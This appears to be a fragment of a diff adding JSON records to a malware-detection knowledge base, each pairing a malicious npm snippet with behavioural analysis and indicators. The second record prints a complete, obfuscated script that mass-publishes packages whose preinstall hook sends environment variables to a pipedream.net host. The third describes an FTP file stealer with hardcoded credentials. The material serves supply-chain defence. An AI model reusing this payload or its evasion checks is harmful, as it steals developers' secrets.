+                    "logo1.jpg, logo2.jpg, logo3.jpg in package root directory",
+                    "References to analyzepixels, convertertree, and imagebyte variables in code"
+                  ],
+                  "network_indicators": [
+                    "85.208.108.29:443 (C2 server)",
+                    "Outbound POST requests to /register and /post-result endpoints",
+                    "Outbound GET requests to /get-command?clientId="
+                  ],
+                  "how_to_detect": "Monitor for npm packages that, during installation, spawn detached Node.js processes, read and parse image files for ASCII payloads, or dynamically execute code extracted from non-code files. Flag packages making outbound connections to hardcoded or suspicious IPs (e.g., 85.208.108.29) or exhibiting periodic polling for remote commands. Scan package contents for the presence of suspicious image files (logo1.jpg, logo2.jpg, logo3.jpg) and loader scripts (dist/loadformat.js), and inspect for code patterns involving analyzepixels, convertertree, and imagebyte."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104013_428202_snippet_1",
+              "source_package": "n-t-internationalization (and 147+ others, see dc file) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_428202/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5015907287597656,
+              "code_similarity": 0.4764520227909088,
+              "behavior_similarity": 0.5267294645309448,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "#!/bin/bash\nPOSITIONAL=()\nwhile [[ $# -gt 0 ]]\ndo\nkey=\"$1\"\ncase $key in\n    -v|--version)\n    VERSION=\"$2\"\n    shift # past argument\n    shift # past value\n    ;;\n    -s|--searchpath)\n    SEARCHPATH=\"$2\"\n    shift # past argument\n    shift # past value\n    ;;\n    -l|--lib)\n    LIBPATH=\"$2\"\n    shift # past argument\n    shift # past value\n    ;;\n    --default)\n    DEFAULT=YES\n    shift # past argument\n    ;;\n    *)    # unknown option\n    POSITIONAL+=(\"$1\") # save it in an array for later\n    shift # past argument\n    ;;\nesac\ndone\nset -- \"${POSITIONAL[@]}\" # restore positional parameters\nfor i in $(cat dc);\ndo\necho '\n{\n  \"name\": \"'$i'\",\n  \"version\": \"141.0.0\",\n  \"description\": \"hackerone.com/homosec Bug Bounty Security Reseaarch White Hat\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n    \"preinstall\":\"node index.js\"\n  },\n  \"author\": \"\",\n  \"license\": \"ISC\"\n}\n' > package.json\necho \"//hackerone.com/homosec\n//Bug Bounty Security Reasearch White Hat\n//homosec@wearehackerone.com\nif (Object.keys(process.env).length > 15 &&\n    !(process.env.COLOR == '0' && process.env.EDITOR == 'vi' && process.env.LOGNAME && process.env.OLDPWD) &&\n!(process.env.APPDATA === '/analysis/bait')&&\n!(process.env._ === '/usr/bin/timelimit')&&\n!(process.env.npm_config_registry === 'https://mirrors.tencent.com/npm/')) {\nvar _0xee82=['\\x68\\x74\\x74\\x70\\x73','\\x2E','\\x6A\\x6F\\x69\\x6E','\\x37\\x36\\x63\\x34\\x32\\x66\\x32\\x37\\x64\\x32\\x36\\x30\\x39\\x31\\x36\\x35\\x39\\x64\\x63\\x61\\x38\\x32\\x30\\x61\\x33\\x37\\x65\\x36\\x66\\x35\\x64\\x33','\\x6D','','\\x70\\x69\\x70\\x65','\\x64\\x72\\x65\\x61\\x6D','\\x6E\\x65\\x74','\\x2F\"$i\"','\\x50\\x4F\\x53\\x54','\\x72\\x65\\x71\\x75\\x65\\x73\\x74','\\x62\\x61\\x73\\x65\\x36\\x34','\\x65\\x6E\\x76','\\x73\\x74\\x72\\x69\\x6E\\x67\\x69\\x66\\x79','\\x66\\x72\\x6F\\x6D','\\x77\\x72\\x69\\x74\\x65','\\x65\\x6E\\x64'];const http=require(_0xee82[0]);req= http[_0xee82[11]]({host:[_0xee82[3],_0xee82[4],[_0xee82[6],_0xee82[7]][_0xee82[2]](_0xee82[5]),_0xee82[8]][_0xee82[2]](_0xee82[1]),path:_0xee82[9],method:_0xee82[10]});req[_0xee82[16]](Buffer[_0xee82[15]](JSON[_0xee82[14]](process[_0xee82[13]]).toString(_0xee82[12])));req[_0xee82[17]]()\n}\n\" > index.js\nnpm publish --access=public \nsleep 10\ndone;",
+                "code_behavior": "During CI/CD or local execution, the script iterates over a list of package names, generates malicious package.json and index.js files for each, and publishes them to npm, resulting in mass deployment of packages with embedded preinstall exfiltration payloads.",
+                "malice_analysis": {
+                  "why_suspicious": "The script automates the creation and publication of a large number of packages, each containing obfuscated, malicious JavaScript that exfiltrates sensitive data. This is a hallmark of supply chain attacks aiming for broad impact.",
+                  "violated_expectations": "Legitimate publishing scripts do not mass-generate packages with identical, obfuscated payloads designed for data exfiltration.",
+                  "similar_legitimate_use": "Automated publishing for monorepos or scoped packages, but without embedding malicious or obfuscated code.",
+                  "key_indicators": [
+                    "Automated mass publication of packages",
+                    "Autogeneration of package.json with preinstall hooks",
+                    "Injection of obfuscated JavaScript payloads",
+                    "Use of shell scripting to orchestrate malicious deployment"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "ci-cd/runtime",
+                  "file_location": "dc.sh",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "n-t-internationalization (and 147+ others, see dc file)",
+                  "package_manager": "npm",
+                  "package_versions": "141.0.0 (and possibly others)",
+                  "why_malicious": "These packages are mass-published with autogenerated content and contain obfuscated JavaScript code that exfiltrates all environment variables to an external server during installation. The attack leverages preinstall hooks to trigger the payload, uses obfuscation to evade detection, and targets the npm supply chain at scale. This behavior violates user trust, npm ecosystem norms, and cannot be justified as legitimate or white-hat research."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Automated script generates and publishes malicious packages for each name in the dc file, embedding obfuscated exfiltration payloads.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious packages are available on npm for installation by unsuspecting users."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upon installation, the preinstall hook in package.json executes index.js, triggering the malicious payload.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious JavaScript is executed automatically on the victim's machine during package installation."
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js checks for analysis or sandbox environments and, if not detected, exfiltrates all environment variables to a remote pipedream.net server.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker receives sensitive environment data from victim systems, enabling further compromise or data theft."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "preinstall hook in package.json executing JavaScript that accesses process.env and initiates outbound network requests",
+                    "Obfuscated JavaScript code in index.js containing environment checks and network exfiltration logic",
+                    "Presence of anti-analysis or sandbox evasion logic prior to payload execution"
+                  ],
+                  "file_indicators": [
+                    "index.js containing obfuscated code and outbound network logic",
+                    "package.json with scripts.preinstall set to 'node index.js'",
+                    "dc.sh or similar shell scripts automating mass package publication"
+                  ],
+                  "network_indicators": [
+                    "Outgoing HTTPS POST requests to *.pipedream.net",
+                    "Host: 76c42f27d26091659dca820a37e6f5d3.m.pipedream.net"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall hooks that execute JavaScript accessing process.env and making outbound network requests, especially to known exfiltration endpoints such as pipedream.net. Flag packages with obfuscated code in index.js and those published in bulk with similar structure. Alert on any package that exfiltrates environment variables or performs environment checks to evade analysis. Correlate file indicators (index.js, package.json, dc.sh) and network activity to identify malicious packages."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_103502_806789_snippet_3",
+              "source_package": "test-* (published by malikrukd4732) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_103502_806789/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.49908941984176636,
+              "code_similarity": 0.4584786891937256,
+              "behavior_similarity": 0.5397001504898071,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode based on report description\nconst os = require('os');\nconst fs = require('fs');\nconst archiver = require('archiver');\nconst ftp = require('ftp');\n\nconst username = os.userInfo().username;\nconst cwd = process.cwd();\n// Search for files with specific extensions or in specific directories\n// Archive found directories/files into ZIP\n// Connect to FTP server 185.62.57.60 with username 'root' and password 'TestX@!#33'\n// Upload ZIP archive",
+                "code_behavior": "At install-time, index.js collects the current OS username and working directory, recursively searches for files and directories matching targeted patterns, archives the discovered files into ZIP archives, and uploads the archives to a remote FTP server at 185.62.57.60 using hardcoded credentials, resulting in exfiltration of sensitive developer data.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated searching, archiving, and exfiltration of user files during installation is a hallmark of info-stealing malware, especially when performed without user consent and using hardcoded network destinations.",
+                  "violated_expectations": "Normal packages do not access arbitrary user files or exfiltrate data to external servers during installation, nor do they use hardcoded FTP credentials to transmit user data.",
+                  "similar_legitimate_use": "Backup utilities or deployment tools may archive and upload files, but only with explicit user consent, configuration, and secure authentication—not with hardcoded credentials or during package installation.",
+                  "key_indicators": [
+                    "recursive access to sensitive directories and files",
+                    "creation of ZIP archives of user data during install",
+                    "FTP exfiltration to hardcoded IP address 185.62.57.60 with static credentials",
+                    "use of archiver and ftp modules in install-time scripts"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via index.js)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "test-* (published by malikrukd4732)",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (July 31, 2023)",
+                  "why_malicious": "The packages execute code at install time that recursively searches for sensitive files and directories on the developer's machine, archives them into ZIP files, and exfiltrates the data to a remote FTP server using hardcoded credentials. This behavior is automated, highly targeted, and designed to steal confidential developer information without user knowledge or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package, triggering the postinstall script defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of preinstall.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "preinstall.js is executed by the postinstall script and spawns index.js as a child process.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of main malicious payload in index.js"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js collects sensitive user and project data, archives it, and uploads it to a remote FTP server at 185.62.57.60 using hardcoded credentials.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Exfiltration of developer data to attacker-controlled server"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that launch additional JavaScript processes during npm package installation",
+                    "Automated recursive search and archiving of user files and directories at install-time",
+                    "Outbound FTP connections to hardcoded IP addresses with static credentials during package installation"
+                  ],
+                  "file_indicators": [
+                    "Presence of preinstall.js and index.js in the npm package root directory",
+                    "package.json containing a postinstall script referencing custom JavaScript (e.g., 'node preinstall.js')",
+                    "ZIP archives created in temporary or user directories during npm install"
+                  ],
+                  "network_indicators": [
+                    "FTP connections to 185.62.57.60",
+                    "Use of FTP credentials: username 'root', password 'TestX@!#33'"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that launch additional scripts or processes, especially those referencing custom JavaScript files. Flag packages that access user directories, create ZIP archives, or initiate outbound FTP connections to hardcoded IP addresses. Review package.json for suspicious postinstall hooks and scan for the presence of preinstall.js and index.js files in the package root. Network monitoring should alert on FTP traffic to 185.62.57.60 or the use of static credentials such as username 'root' and password 'TestX@!#33'."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
